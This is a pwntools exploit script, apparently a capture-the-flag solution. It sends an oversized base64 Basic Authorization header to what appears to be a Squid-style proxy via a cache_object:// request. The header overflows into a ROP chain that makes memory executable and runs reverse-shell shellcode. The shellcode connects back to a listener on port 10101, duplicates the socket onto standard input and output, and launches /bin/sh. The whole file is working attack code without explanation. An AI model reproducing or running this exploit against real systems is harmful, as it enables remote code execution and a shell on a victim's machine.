from pwn import *

context.arch = 'amd64'

###Addr
decodeAuthToken = 0xc69280
some_structure = 0xc6b2b0

###ROPgadget
mov_esp_ebx = 0x8b05e1
pop_rsp = 0x4f06b5
pop_rdi = 0x4f0040
pop_rsi = 0x4f096a
pop_rdx = 0x4f2a05
pop_rax = 0x41389d
syscall = 0x9b5464

###Exploit
r = remote('nc.eonew.cn',10017)
l = listen(10101)

payload  = 'GET cache_object://127.0.0.1/info HTTP/1.1\n'
payload += 'HOST: 127.0.0.1\n'
payload += 'Authorization: Basic '

ROPchain = p64(pop_rdi)+p64(decodeAuthToken&0xfffffffffffff000)+\
           p64(pop_rsi)+p64(0x1000)+\
           p64(pop_rdx)+p64(7)+\
           p64(pop_rax)+p64(10)+\
           p64(syscall)+\
           p64(decodeAuthToken+0x50)
shellcode = asm(f'''
                 push 2
                 pop rdi
                 push 1
                 pop rsi
                 xor rdx,rdx
                 push 41
                 pop rax
                 syscall
                 push rax
                 pop r12

                 push r12
                 pop rdi
                 mov rsi,{decodeAuthToken+0x50+0x50}
                 push 0x10
                 pop rdx
                 push 42
                 pop rax
                 syscall

                 push r12
                 pop rdi
                 xor rsi,rsi
                 push 33
                 pop rax
                 syscall

                 push r12
                 pop rdi
                 push 1
                 pop rsi
                 push 33
                 pop rax
                 syscall

                 mov rdi,{decodeAuthToken+0x50+0x60}
                 xor rsi,rsi
                 push rsi
                 pop rdx
                 push 59
                 pop rax
                 syscall
                 ''')
#arguments = p16(2)+p16(10101,endian='big')+p32(0x221e708c)+p64(0)+b'/bin/sh\x00'
arguments = p16(2)+p16(10101,endian='big')+p32(0x22c2708c)+p64(0)+b'/bin/sh\x00'
content  = (shellcode.ljust(0x50,b'\x00')+arguments).ljust(0x2030+0x108*2,b'\x00')
stub2 = p64(pop_rsp)+p64(decodeAuthToken)
content += stub2.ljust(0x28,b'\x00')
stub1 = p64(mov_esp_ebx)
content += stub1
content = b64e(content)
payload += content
payload += '\n\n'

r.send(payload)
l.wait_for_connection()
l.interactive()
